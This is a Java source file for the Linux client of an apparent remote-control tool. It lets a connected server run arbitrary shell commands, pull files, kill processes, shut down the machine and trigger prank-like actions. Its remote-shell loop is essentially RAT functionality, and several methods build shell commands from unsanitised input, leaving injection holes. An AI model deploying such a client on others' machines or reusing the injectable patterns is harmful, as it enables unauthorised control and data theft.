package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyEvent;
import java.io.*;
import java.net.Socket;
import java.util.ArrayList;

/**
 * methods to control a linux machine. xrandr and gnome required
 * for all the methods to work
 */
public class LinuxCommandSet extends CommandSet
{
    public LinuxCommandSet(Socket connection)
    {
        super(connection);
        try
        {
            UIManager.setLookAndFeel("com.sun.java.swing.plaf.gtk.GTKLookAndFeel");
        }
        catch(Exception e)
        {
            System.err.println("Failed to set Linux look and feel. Using default Java look and feel");
        }
    }

    /**
     * allows the server to control a local shell on the client
     *
     * Remote Shell Protocol
     * =====================
     * 1. send the clients username to the server
     * 2. send the current directory to the server (first time the temp path is sent)
     * 3. read string from the server, if it isn't the terminate string then...
     * 4. run the command provided and update the current directory if needed
     * 5. send any output of the command to the server as a string, or end of command if no output
     */
    @Override
    public void remoteShell()
    {
        sendStringToServer(System.getProperty("user.name"));
        String workingDirectory = getTempPath();
        sendStringToServer(workingDirectory);

        String inputCommand;
        while(!(inputCommand = getCommandFromServer()).equals(REMOTE_SHELL_TERMINATE))
        {
            try
            {
                if(inputCommand.startsWith(REMOTE_SHELL_TRANSFER))
                {
                    String filePathToTransfer = inputCommand.split("\\s+")[1]; // get_file thefile
                    sendFile(new File(workingDirectory + File.separator + filePathToTransfer));
                    continue;
                }

                // runs the systems shell, changes dir to the current one, runs the supplied command, then pwd so we can track our current location (if user ran a dir changing command)
                String[] command = {"/bin/sh", "-c", "cd " + workingDirectory + "; " + inputCommand + " ; pwd;"};
                Process process = getRuntime().exec(command);
                if(process.waitFor() != RETURN_SUCCESS)
                    throw new Exception("Process returned a non-zero value, indicating failure");

                ArrayList<String> fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getInputStream()))); // used later so we can get pwd output and track our workingDirectory

                workingDirectory = fullOutput.get(fullOutput.size() - 1).replace("\n", ""); // this is pwd's output. Used to keep track of working dir as we have to have a new process for each command given
                sendStringToServer(workingDirectory);
                fullOutput.remove(fullOutput.size() - 1);
                if(!fullOutput.isEmpty()) // if the cmd created output in stdout we must let server know so it can read the stdout
                {
                    sendStringToServer(REMOTE_SHELL_INDICATE_STDOUT);
                    sendStringToServer(arrayListToString(fullOutput));
                    continue;
                }

                // print any errors back to server
                fullOutput.clear();
                fullOutput = getStreamData(new BufferedReader(new InputStreamReader(process.getErrorStream())));
                if(!fullOutput.isEmpty()) // if cmd created output in stderr we must tell the server so it can read the error
                {
                    sendStringToServer(REMOTE_SHELL_INDICATE_STDERR);
                    sendStringToServer(arrayListToString(fullOutput));
                    continue;
                }

                sendStringToServer(REMOTE_SHELL_INDICATE_END); // no output from the command, so indicate the command is complete
            }
            catch(Exception ioe)
            {
                sendStringToServer(REMOTE_SHELL_INDICATE_STDERR);
                sendStringToServer(ioe.getMessage());
                ioe.printStackTrace();
            }
        }
    }

    /**
     * reads out the message provided using text to speech. Requires `espeak` to be installed on
     * the clients machine
     * @param message the message to read out
     */
    @Override
    public void talk(String message)
    {
        try
        {
            message = message.replace(" ", "_"); // for unknown reasons `espeak` will fail to read a message with spaces in it when called
                                                 // from running `exec()`, however it will work properly if you replace any spaces with underscores
            String text = "espeak \"" + message + "\"";
            System.out.println("Running command: " + text);

            getRuntime().exec(text);
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
        }
    }

    /**
     * kills the process with the process id supplied
     * @param pid the process id of the task to kill
     * @return true if the process was killed, false otherwise
     */
    @Override
    public boolean killProcess(int pid)
    {
        try
        {
            Process process = getRuntime().exec("kill " + pid);
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            return false;
        }
        return true;
    }

    /**
     * kills the process supplied
     * @param processName the name of the process to kill
     * @return true if the process was killed, false otherwise
     */
    @Override
    public boolean killProcess(String processName)
    {
        try
        {
            Process process = getRuntime().exec("pkill " + processName);
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            return false;
        }
        return true;
    }

    /**
     * gets the running processes on the clients machine. Uses the `ps` command
     * @return a string containing all the running processes
     * @throws IOException if something went wrong with exec()
     */
    @Override
    public String getRunningProcesses() throws IOException
    {
        String procCommand = "ps -fjH -u " + System.getProperty("user.name"); // we only want our logged in users processes
        Process process = getRuntime().exec(procCommand);
        BufferedReader inFromProcess = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder processList = new StringBuilder();
        String line;
        while((line = inFromProcess.readLine()) != null)
            processList.append(line + "\n");

        processList.deleteCharAt(processList.length() - 1); // remove trailing new line character
        return processList.toString();
    }

    /**
     * minimises all windows. Due to Linux distros doing things slightly different from each other, multiple
     * commands to minimise all windows have been included
     */
    @Override
    public void minimise()
    {
        Robot robot = getRobot();
        // CTRL+ALT+D
        robot.keyPress(KeyEvent.VK_CONTROL);
        robot.keyPress(KeyEvent.VK_ALT);
        robot.keyPress(KeyEvent.VK_D);
        robot.keyRelease(KeyEvent.VK_CONTROL);
        robot.keyRelease(KeyEvent.VK_ALT);
        robot.keyRelease(KeyEvent.VK_D);
        // WIN+D
        robot.keyPress(KeyEvent.VK_WINDOWS);
        robot.keyPress(KeyEvent.VK_D);
        robot.keyRelease(KeyEvent.VK_WINDOWS);
        robot.keyRelease(KeyEvent.VK_D);
        // CTRL+WIN+D
        robot.keyPress(KeyEvent.VK_CONTROL);
        robot.keyPress(KeyEvent.VK_WINDOWS);
        robot.keyPress(KeyEvent.VK_D);
        robot.keyRelease(KeyEvent.VK_CONTROL);
        robot.keyRelease(KeyEvent.VK_WINDOWS);
        robot.keyRelease(KeyEvent.VK_D);
    }

    /**
     * rotates the screen. Linux version relies on xrandr being installed on the clients system
     * @param direction the orientation to rotate the screen (up, down, left, right)
     * @return true if the screen was rotated, false otherwise
     */
    @Override
    public boolean rotate(String direction)
    {
        try
        {
            Process process = getRuntime().exec("xrandr --output default --rotate " + direction);
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            return false;
        }

        return true;
    }

    @Override
    public boolean eject()
    {
        try
        {
            Process process = getRuntime().exec("eject");
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            return false;
        }
        return true;
    }

    @Override
    public void shutdown() throws IOException
    {
        getRuntime().exec("shutdown now");
    }

    @Override
    public void restart() throws IOException
    {
        getRuntime().exec("shutdown -r now");
    }

    /**
     * tries to set the wallpaper. Only supports gnome systems
     * @param wallpaper the image file we want to use as the new wallpaper
     */
    @Override
    public boolean setWallpaper(File wallpaper)
    {
        try
        {
            Process process = getRuntime().exec("gsettings set org.gnome.desktop.background picture-uri file:///" + wallpaper.getAbsolutePath());
            if(!wasSuccessful(process))
                return false;
        }
        catch(IOException ioe)
        {
            System.err.println("Failed to set wallpaper");
            ioe.printStackTrace();
            return false;
        }
        return true;
    }
}